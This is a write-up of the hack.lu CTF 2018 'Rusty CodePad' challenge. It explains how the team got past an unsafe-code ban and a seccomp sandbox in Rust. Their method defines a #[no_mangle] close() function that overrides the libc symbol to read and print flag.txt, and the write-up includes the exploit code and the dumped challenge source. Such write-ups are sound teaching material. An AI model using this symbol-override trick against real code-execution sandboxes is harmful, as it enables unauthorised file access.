# hacklu CTF 2018 - Rusty CodePad

```
I heard Rust is a safe programming language.
So I built this CodePad where you can compile and run safe Rust code.
```

## Initial Situation

We had access to a web-terminal with a limited set of commands:

```sh
$ help
help - print this help
clear - clear screen
ls - list files
cat - print file content
rusty - compile rusty code
version - print version
```

Calling ```ls``` reveals a Rust project file structure and a file called ```flag.txt```:

```
$ ls
flag.txt
target
src
lib
rusty.sh
Cargo.toml
```

Now, running ```cat``` on ```flag.txt``` would just return ```*REDACTED*```. Parts of the main rust source file have also been redacted:

```rust
extern crate code;
use code::code;
// *REDACTED*
fn main() {
    // let flag = *REDACTED*;
    code();
}
```

This means, the flag should be somewhere in the memory of the program as well. The ```rusty``` command lets us upload a ```lib.rs``` file, allowing us to provide the contents for the ```code``` lib, but disallowing unsafe code usage within the library:

```sh
$ cat rusty.sh
#!/bin/sh
echo "$CODE" > ./lib/code/src/lib.rs
RUSTFLAGS="-F unsafe-code" cargo +$VERSION build -p code && cargo +$VERSION run
```

## Solution

Now we first tried to open the flag file with ```std::fs::File::open()```, but didn't succeed. Even with correct error handling and ```catch_unwind()``` the program still crashed without notice; for other functionality involving syscalls as well. So we figured there might have been a seccomp filter been applied. 

We remembered a certain issue, whereas a redefinition of ```read()``` or ```write()``` would result in the override of these functions during the linking phase, without warning. We couldn't find the exact issue/reddit post, but [this issue](https://github.com/rust-lang/rust/issues/28179) describes the problems with ```#[no_mangle]```, which is not treated as unsafe, but can be used to write horribly unsafe code.

We then proceeded to override ```read()``` and other syscalls without a clear direction to just try out certain things. One of us pointed out, since the flag is stored in a file, it is probably read at the start of the program, before seccomp filters are enabled. When dumping the ```read()``` file descriptor, we could see that there was indeed an open file descriptor other than stdin/stdout. Now it was only a matter of finding the correct syscall to override (since we couldn't read the file anymore if we override read). We picked ```close()```, read the file, dumped the flag and then killed the program:

```rust
#[no_mangle]
pub extern fn close() {
    use std::io::Read;
    
    if let Ok(mut f) = std::fs::File::open("flag.txt") {
        let mut flag = String::new();
        f.read_to_string(&mut flag).unwrap();
        println!("{}", flag);
        std::process::exit(0);
    }
}

pub fn code() { }
```

## Additional Info

The same method also allowed us to dump the ```src/main.rs``` file and to see, that this probably wasn't the intended solution:

```rust
extern crate libc;
extern crate rand;
extern crate code;
use std::char;
use std::fs::File;
use std::io::prelude::*;
use libc::{prctl, PR_SET_SECCOMP, SECCOMP_MODE_STRICT};
use rand::random;
use code::code;
#[derive(Debug)]
struct CryptedChar {
    character: u32,
    key: u32,
}
impl CryptedChar {
    fn new(character: char) -> CryptedChar {
        let key: u32 = random();
        CryptedChar {
            character: character as u32 ^ key,
            key
        }
    }
    fn from_u8(character: u8) -> CryptedChar {
        CryptedChar::new(char::from_u32(character as u32).unwrap_or_else(|| '?'))
    }
}
fn main() {
    // read crypted flag
    let mut flag = vec![];
    {
        let mut c = [0u8; 1];
        let mut file = File::open("flag.txt")
            .expect("could not open flag");
        while let Ok(_) = file.read_exact(&mut c) {
            flag.push(CryptedChar::from_u8(c[0]))
        }
    }
    // filter syscalls
    let ret = unsafe { prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT) };
    if ret != 0 {
        panic!("Unable to activate seccomp");
    }
    // execute code
    code();
}
```